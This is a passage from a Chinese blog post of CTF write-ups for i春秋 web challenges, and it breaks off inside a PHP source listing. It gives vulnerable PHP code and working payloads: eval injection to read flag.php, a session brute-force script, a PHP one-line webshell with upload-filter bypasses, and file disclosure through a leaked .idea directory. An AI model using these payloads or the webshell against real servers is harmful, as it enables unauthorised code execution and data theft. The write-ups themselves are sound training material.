<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>i 春秋 Web 练习记录 - Lab on Mercury</title><meta name=Description content="Lab on Mercury"><meta property="og:title" content="i 春秋 Web 练习记录"><meta property="og:description" content="i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/icq-web/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-08-24T20:42:38+00:00"><meta property="article:modified_time" content="2019-08-24T20:42:38+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="i 春秋 Web 练习记录"><meta name=twitter:description content="i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。"><meta name=application-name content="Lab on Mercury"><meta name=apple-mobile-web-app-title content="Lab on Mercury"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://blog.sigmerc.top/icq-web/><link rel=prev href=https://blog.sigmerc.top/shiyanba-web/><link rel=next href=https://blog.sigmerc.top/isg2019/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"i 春秋 Web 练习记录","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/blog.sigmerc.top\/icq-web\/"},"genre":"posts","keywords":"PHP, Hash, 古典密码与编码, SQLi, 文件上传, 反序列化","wordcount":6242,"url":"https:\/\/blog.sigmerc.top\/icq-web\/","datePublished":"2019-08-24T20:42:38+00:00","dateModified":"2019-08-24T20:42:38+00:00","publisher":{"@type":"Organization","name":"Mercury","logo":{"@type":"ImageObject","url":"https:\/\/blog.sigmerc.top\/my_avatar.png","width":400,"height":400}},"author":{"@type":"Person","name":"Mercury"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/><i class="fas fa-archive fa-fw"></i> 文章 </a><a class=menu-item href=/tags/><i class="fas fa-tags fa-fw"></i> 标签 </a><a class=menu-item href=/categories/><i class="fas fa-th fa-fw"></i> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Lab on Mercury"><span class=header-title-pre><i class="fas fa-meteor fa-fw"></i></span>Lab on Mercury</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title><i class="fas fa-archive fa-fw"></i>文章</a><a class=menu-item href=/tags/ title><i class="fas fa-tags fa-fw"></i>标签</a><a class=menu-item href=/categories/ title><i class="fas fa-th fa-fw"></i>分类</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw"></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">i 春秋 Web 练习记录</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Mercury</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/web-%E5%AE%89%E5%85%A8/><i class="far fa-folder fa-fw"></i>Web 安全</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2019-08-24>2019-08-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 6242 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 13 分钟&nbsp;<span id=/icq-web/ class=leancloud_visitors data-flag-title="i 春秋 Web 练习记录">
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#爆破---1>爆破 - 1</a></li><li><a href=#爆破---2>爆破 - 2</a></li><li><a href=#爆破---3>爆破 - 3</a></li><li><a href=#upload>Upload</a></li><li><a href=#code>Code</a></li><li><a href=#yesercms>YeserCMS</a></li><li><a href=#xss-平台>XSS 平台</a></li><li><a href=#再见-cms>再见 CMS</a></li><li><a href=#sql>SQL</a></li><li><a href=#sqli>SQLi</a></li><li><a href=#123>123</a></li><li><a href=#test>Test</a></li><li><a href=#login>Login</a></li><li><a href=#backdoor>Backdoor</a></li><li><a href=#getflag>GetFlag</a></li><li><a href=#not-found>Not Found</a></li><li><a href=#vld>Vld</a></li><li><a href=#exec>EXEC</a></li></ul></nav></div></div><div class=content id=content><p>i 春秋上的题都是比赛真题，所以会比较有意思，也更复杂一些。</p><h2 id=爆破---1>爆破 - 1</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s2>&#34;flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;hello&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^\w*$/&#39;</span><span class=p>,</span><span class=nv>$a</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>  <span class=k>die</span><span class=p>(</span><span class=s1>&#39;ERROR&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=s2>&#34;var_dump($</span><span class=si>$a</span><span class=s2>);&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>要求参数 <code>hello</code> 为纯字母，又看到 <code>eval(var_dump($$a));</code> 语句，可以想到使用 <code>$GLOBALS</code> 打印出所有变量，payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?hello=GLOBALS
</span></span></code></pre></td></tr></table></div></div><p>等等，好像没爆破啊？感觉是非预期解。</p><h2 id=爆破---2>爆破 - 2</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include</span> <span class=s2>&#34;flag.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=o>@</span><span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;hello&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=s2>&#34;var_dump(</span><span class=si>$a</span><span class=s2>);&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>提示 <code>flag</code> 不在变量中，那么只能直接读 <code>flag.php</code> 文件了，payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?hello=file(&#39;flag.php&#39;)
</span></span></code></pre></td></tr></table></div></div><p>另一种 payload 则类似注入：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?hello=);show_source(‘flag.php’);//
</span></span></code></pre></td></tr></table></div></div><h2 id=爆破---3>爆破 - 3</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>require</span><span class=p>(</span><span class=s1>&#39;./flag.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;nums&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>  <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;nums&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;time&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>time</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;whoami&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;ea&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;time&#39;</span><span class=p>]</span><span class=o>+</span><span class=mi>120</span><span class=o>&lt;</span><span class=nx>time</span><span class=p>()){</span>
</span></span><span class=line><span class=cl>  <span class=nx>session_destroy</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$value</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span><span class=s1>&#39;value&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$str_rand</span> <span class=o>=</span> <span class=nx>range</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>,</span> <span class=s1>&#39;z&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$str_rands</span> <span class=o>=</span> <span class=nv>$str_rand</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>25</span><span class=p>)]</span><span class=o>.</span><span class=nv>$str_rand</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>25</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;whoami&#39;</span><span class=p>]</span><span class=o>==</span><span class=p>(</span><span class=nv>$value</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=nv>$value</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$value</span><span class=p>),</span><span class=mi>5</span><span class=p>,</span><span class=mi>4</span><span class=p>)</span><span class=o>==</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;nums&#39;</span><span class=p>]</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;whoami&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$str_rands</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=nv>$str_rands</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;nums&#39;</span><span class=p>]</span><span class=o>&gt;=</span><span class=mi>10</span><span class=p>){</span>
</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>首先如果 <code>cookie</code> 中不设置 <code>nums</code> 会给 <code>whoami</code> 设置默认值 <code>ea</code>，且 <code>session</code> 只能维持 120ms，所以应该需要用脚本跑。</p><p>接下来，如果 <code>whoami</code> 和传入的 <code>value</code> 相同，且 <code>value</code> 的 MD5 值子串为 0，那么 <code>nums</code> 就加 1，<code>whoami</code> 更新为两个新的随机字母。后一个条件可以很容易地用数组绕过。</p><p>我们尝试传入 <code>value=ea</code>，果然显示了 <code>whoami</code> 的下一个值。脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://4451e735c9e046bcb09a4404756ca952c586da682cfe47b9.changame.ichunqiu.com/?value[]=ea&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ss</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>ss</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>  <span class=n>r</span> <span class=o>=</span> <span class=n>ss</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>[:</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>  <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>[:</span><span class=mi>50</span><span class=p>])</span>
</span></span></code></pre></td></tr></table></div></div><p>需要注意的是所有请求都要维持在同一 session 下。</p><p>这题终于有点爆破的意思了。</p><h2 id=upload>Upload</h2><p>尝试上传 php 一句话木马，发现过滤了 <code>&lt;?</code> 和 <code>php</code>，对前者利用 <code>&lt;script></code> 绕过，后者则大写绕过。payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span> <span class=nx>language</span><span class=o>=</span><span class=s2>&#34;PHP&#34;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>  <span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;ant&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=o>&lt;/</span><span class=nx>script</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>上传 getshell，在上级目录得到 <code>flag.php</code>。</p><h2 id=code>Code</h2><p>题目链接中含有 <code>?jpg=hei.jpg</code>，猜测可能可以通过这个读文件，尝试 <code>?jpg=index.php</code>，F12 得到 base64 后的源代码，解码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * Created by PhpStorm.
</span></span></span><span class=line><span class=cl><span class=sd> * Date: 2015/11/16
</span></span></span><span class=line><span class=cl><span class=sd> * Time: 1:31
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;content-type:text/html;charset=utf-8&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;jpg&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Refresh:0;url=./index.php?jpg=hei.jpg&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;jpg&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s1>&#39;&lt;title&gt;file:&#39;</span><span class=o>.</span><span class=nv>$file</span><span class=o>.</span><span class=s1>&#39;&lt;/title&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s2>&#34;/[^a-zA-Z0-9.]+/&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;config&#34;</span><span class=p>,</span><span class=s2>&#34;_&#34;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$txt</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;img src=&#39;data:image/gif;base64,&#34;</span><span class=o>.</span><span class=nv>$txt</span><span class=o>.</span><span class=s2>&#34;&#39;&gt;&lt;/img&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * Can you find the flag file?
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>注意这里会对 <code>file</code> 进行过滤，将非数字 / 字母删除，并将 <code>config</code> 换成 <code>_</code>，但是我们并不知道我们要读的文件是什么。</p><p>这时可以注意到注释：<code>Created by PhpStorm</code>，猜想是 <code>.idea</code> 泄漏，因此访问 <code>/.idea/workspace.xml</code>，可以发现文件 <code>fl3g_ichuqiu.php</code>。由于 <code>_</code> 不是数字或字母，我们应用上述规则访问 <code>fl3gconfigichuqiu.php</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>index.php?jpg=fl3gconfigichuqiu.php
</span></span></code></pre></td></tr></table></div></div><p>解码得到：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd> * Created by PhpStorm.
</span></span></span><span class=line><span class=cl><span class=sd> * Date: 2015/11/16
</span></span></span><span class=line><span class=cl><span class=sd> * Time: 1:31
</span></span></span><span class=line><span class=cl><span class=sd> */</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=k>E_ALL</span> <span class=o>||</span> <span class=o>~</span><span class=nx>E_NOTICE</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;config.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>random</span><span class=p>(</span><span class=nv>$length</span><span class=p>,</span> <span class=nv>$chars</span> <span class=o>=</span><span class=s1>&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$hash</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$max</span> <span class=o>=</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$chars</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$length</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$hash</span> <span class=o>.=</span> <span class=nv>$chars</span><span class=p>[</span><span class=nx>mt_rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nv>$max</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$hash</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>encrypt</span><span class=p>(</span><span class=nv>$txt</span><span class=p>,</span><span class=nv>$key</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$txt</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$tmp</span> <span class=o>.=</span> <span class=nx>chr</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$txt</span><span class=p>[</span><span class=nv>$i</span><span class=p>])</span><span class=o>+</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$txt</span> <span class=o>=</span> <span class=nv>$tmp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$rnd</span><span class=o>=</span><span class=nx>random</span><span class=p>(</span><span class=mi>4</span><span class=p>);</span>
